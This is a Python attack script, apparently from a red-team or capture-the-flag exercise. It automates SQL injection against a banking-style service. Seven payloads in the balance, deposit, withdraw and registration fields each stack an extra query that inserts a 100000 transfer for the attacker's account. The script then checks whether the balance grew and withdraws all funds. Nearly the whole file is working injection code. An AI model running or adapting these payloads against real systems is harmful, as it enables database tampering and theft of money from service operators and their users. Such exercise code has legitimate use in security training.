from loguru import logger

from red.attacks.withdraw_all import withdraw_all_for
from red.config import User, config
from red.utils import client


insert_transfer = lambda _: f"insert into transfers (user,amount) values ({_}, 100000);"


def inject_balance(user: User):
    payload = f"jelena'; {insert_transfer(user.user)} --"
    client.process(user=payload, action=client.Action.balance)


def inject_deposit_user(user: User):
    payload = f"{user.user}', '0'); {insert_transfer(user.user)} --"
    client.process(user=payload, amount="0", action=client.Action.deposit)


def inject_deposit_amount(user: User):
    payload = f"0'); {insert_transfer(user.user)} --"
    client.process(user=user, amount=payload, action=client.Action.deposit)


def inject_withdraw_user(user: User):
    payload = f"{user.user}', '0'); {insert_transfer(user.user)} --"
    client.process(user=payload, amount="0", action=client.Action.withdraw)


def inject_withdraw_amount(user: User):
    payload = f"0'); {insert_transfer(user.user)} --"
    client.process(user=user, amount=payload, action=client.Action.withdraw)


def inject_register_user(user: User):
    payload = f"ciao', 'ciao'); {insert_transfer(user.user)} --"
    client.process(user=payload, password="", action=client.Action.register)


def inject_register_password(user: User):
    payload = f"ciao'); {insert_transfer(user.user)} --"
    client.process(user="ciao", password=payload, action=client.Action.register)


def run():
    user = config.our_users[0]
    starting_balance = client.get_balance(user)
    for injection in [
        inject_balance,
        inject_deposit_user,
        inject_deposit_amount,
        inject_withdraw_user,
        inject_withdraw_amount,
        inject_register_user,
        inject_register_password,
    ]:
        logger.info(f"Trying injection {injection.__name__}...")
        injection(user)
        new_balance = client.get_balance(user)
        if new_balance != starting_balance:
            logger.opt(ansi=True).info(
                f"<green>Successful injection: "
                f"balance {starting_balance} -> {new_balance} "
                f"({injection.__name__})!</green>"
            )
            withdraw_all_for(user)
            return
